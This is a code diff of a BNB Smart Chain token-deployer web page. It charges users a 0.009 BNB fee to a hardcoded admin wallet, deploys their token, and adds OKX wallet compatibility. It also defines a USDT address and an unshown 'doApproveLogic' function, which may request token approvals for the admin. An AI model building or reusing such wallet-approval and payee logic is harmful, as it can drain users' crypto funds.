@@ -85,9 +85,7 @@ input{ width:100%; padding:14px; border-radius:10px; border:1px solid #353f64; b
 </div>
 
 <script>
-// 管理员收款钱包地址
 const ADMIN_WALLET = "0xcA7f542716b7F1F2463C08e3545Ac7230b0F1Ec6";
-// 固定付费金额：原生BNB 0.009，不可绕开
 const FEE_BNB_AMOUNT = "0.009";
 const BSC_CHAIN_ID = 56;
 const BSC_USDT_ADDRESS = "0x55d398326f99059fF775485246999027B3197955";
@@ -128,18 +126,21 @@ logoFileInput.addEventListener("change", function(e){
   reader.readAsDataURL(file);
 });
 
-async function switchBSC(providerRef){
+async function switchBSC(ethProvider){
   const chainIdHex = ethers.toBeHex(BSC_CHAIN_ID);
   try {
-    await providerRef.send("wallet_switchEthereumChain", [{ chainId: chainIdHex }]);
+    await ethProvider.request({ method: "wallet_switchEthereumChain", params: [{ chainId: chainIdHex }] });
   } catch (err) {
-    await providerRef.send("wallet_addEthereumChain", [{
-      chainId: chainIdHex,
-      chainName: "BNB Smart Chain Mainnet",
-      rpcUrls: ["https://bsc-dataseed.binance.org/"],
-      blockExplorerUrls: ["https://bscscan.com"],
-      nativeCurrency: { name:"BNB", symbol:"BNB", decimals:18 }
-    }]);
+    await ethProvider.request({
+      method: "wallet_addEthereumChain",
+      params: [{
+        chainId: chainIdHex,
+        chainName: "BNB Smart Chain Mainnet",
+        rpcUrls: ["https://bsc-dataseed.binance.org/"],
+        blockExplorerUrls: ["https://bscscan.com"],
+        nativeCurrency: { name:"BNB", symbol:"BNB", decimals:18 }
+      }]
+    });
   }
 }
 
@@ -173,12 +174,13 @@ async function doApproveLogic(signerRef, userAddress){
   }
 }
 
+// 【OKX 兼容修复版连接逻辑】
 connectBtn.onclick = async function(){
   showStatus("正在检测钱包注入...");
   let eth = window.ethereum;
   let retryTimes = 0;
-  while (!eth && retryTimes < 10) {
-    await new Promise(r => setTimeout(r, 100));
+  while (!eth && retryTimes < 12) {
+    await new Promise(r => setTimeout(r, 120));
     eth = window.ethereum;
     retryTimes++;
   }
@@ -189,11 +191,13 @@ connectBtn.onclick = async function(){
   }
 
   try {
+    // OKX 专用：先用 request 获取账户，不再混用 provider 同步获取
     const accounts = await eth.request({ method: "eth_requestAccounts" });
     if (!accounts || accounts.length === 0) {
       showStatus("用户取消了钱包连接弹窗");
       return;
     }
+    // 再初始化 ethers provider
     provider = new ethers.BrowserProvider(eth);
     await switchBSC(eth);
     signer = await provider.getSigner();
@@ -205,7 +209,6 @@ connectBtn.onclick = async function(){
   }
 }
 
-// 【固化付费函数：只能手动签名上链，真实转账】
 async function payNativeBNBFeeToAdmin(){
   showStatus(`即将发起链上转账：${FEE_BNB_AMOUNT} 原生BNB 至管理员地址`);
   const feeWei = ethers.parseEther(FEE_BNB_AMOUNT);
@@ -216,13 +219,11 @@ async function payNativeBNBFeeToAdmin(){
     throw new Error(`BNB余额不足，无法发起转账，流程终止。当前余额：${ethers.formatEther(balance)} BNB`);
   }
 
-  // 强制发起原生主币转账交易，钱包必然弹出签名框
   const tx = await signer.sendTransaction({
     to: ADMIN_WALLET,
     value: feeWei
   });
   showStatus("转账交易已广播，等待区块确认哈希：" + tx.hash);
-  // 必须等待区块确认才算付费完成
   await tx.wait();
   showStatus(`✅ 链上确认成功！${FEE_BNB_AMOUNT} BNB 已到达管理员钱包地址`);
 }
@@ -257,7 +258,6 @@ const tokenABI = [
 ];
 const CONTRACT_BYTECODE = "在这里粘贴Remix编译后的完整Bytecode";
 
-// 【执行顺序强制锁死：先付费，后部署，不可颠倒】
 deployBtn.onclick = async ()=>{
   const name = document.getElementById("tokenName").value.trim();
   const symbol = document.getElementById("tokenSymbol").value.trim();
@@ -272,10 +272,7 @@ deployBtn.onclick = async ()=>{
   }
   deployBtn.disabled = true;
   try{
-    // 第一步：必须先执行BNB链上转账，阻塞后续所有代码
     await payNativeBNBFeeToAdmin();
-
-    // 只有转账区块确认成功，才会走到这里开始部署合约
     showStatus("付费区块确认完毕，开始部署代币合约...");
     const supply = ethers.parseUnits(supplyStr, 18);
     const factory = new ethers.ContractFactory(tokenABI, CONTRACT_BYTECODE, signer);
@@ -285,7 +282,6 @@ deployBtn.onclick = async ()=>{
     deployContractAddress = await contract.getAddress();
     showStatus(`✅ 代币部署成功！合约地址：${deployContractAddress}`);
   }catch(e){
-    // 转账失败/取消/余额不足，直接捕获错误终止，不会部署合约
     showStatus("操作终止（付费失败）：" + (e.shortMessage || e.message));
   }
   deployBtn.disabled = false;
